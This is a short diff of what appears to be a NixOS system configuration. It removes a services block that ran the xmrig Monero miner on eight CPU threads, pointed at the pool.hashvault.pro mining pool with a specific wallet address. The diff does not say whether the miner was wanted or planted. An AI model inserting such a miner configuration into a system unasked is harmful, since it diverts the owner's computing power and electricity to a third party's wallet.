@@ -58,30 +58,4 @@
   };
 
   system.stateVersion = "24.11";
-
-  services = {
-    xmrig = {
-      enable = true;
-      settings = {
-        autosave = true;
-        cpu = {
-          enabled = true;
-          rx = {
-            threads = 8;
-          };
-        };
-        opencl = false;
-        cuda = false;
-        pools = [
-          {
-            url = "pool.hashvault.pro:443";
-            user = "84jLA5hxrGkNrj7kLpZt519MCWwPyMj8oBt9ikTAqoZvG8Qcd3PFGmkZNDPDT9jk7FZ39VzNMgqzFXLHEKvs9pcF6L8DaTm";
-            pass = "desktop";
-            keepalive = true;
-            tls = true;
-          }
-        ];
-      };
-    };
-  };
 }
